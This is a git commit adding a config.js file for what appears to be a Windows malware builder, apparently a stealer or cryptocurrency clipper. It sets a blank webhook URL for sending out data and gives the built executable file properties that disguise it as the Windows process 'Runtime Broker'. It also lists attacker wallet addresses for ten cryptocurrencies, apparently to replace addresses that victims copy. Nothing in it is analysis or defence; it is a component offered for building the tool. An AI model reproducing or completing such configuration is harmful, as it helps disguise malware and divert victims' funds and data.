c0ba121edd7885a54d48b6b2c3d203a6632a5647
Not Bouki <pro@notfubuki.xyz>
2023-07-08 11:00:52 +0200

    Add files via upload

---
+++ config.js
@@ -0,0 +1,24 @@
+module.exports = () => {
+    return {
+        webhook_url: "",
+        icon: './default.ico',
+        properties: {
+            FileDescription: 'Runtime Broker',
+            ProductName: 'Runtime Broker',
+            LegalCopyright: 'Runtime Broker ©️ 2023',
+            OriginalFilename: 'RuntimeBroker.exe'
+        },
+        cryptos: {
+            btc: "bc1q8mtpkcfwlff4dlguhxmsk8lhumzgxcd9t50vta",
+            ltc: "LTN4HSNNypGVtUGv9STKE9o8HmjcTkzeut",
+            xmr: "4B4D15Q6kas9YGxASZsqhBJVTvyDmS4kb522N8AvzNPx4zRgsxxBDzxPXwpZoCToJVMUffwjRDxNn9e8YbSTj7Sw5jGbwGS",
+            eth: "0x2086a641D1dD2C3557e6b880E8A97cfdfDb04d4E",
+            xrp: "rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf",
+            neo: "ANn5THmQidTh6zENyCytJV98i6po1dLJhh",
+            bch: "qzmckzguqmnldh825gjwv49p8zw5c5p02v0605gf5j",
+            doge: "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6",
+            dash: "Xn6Mnu6aDxYz2cmka77JE6w8YTULbHyYBR",
+            xlm: "GB7HQ2WNBSUNHATASST44ADP2ND34BRTHKWWLIKRU6YP54SJUK53OLQG",
+        }
+    }
+}
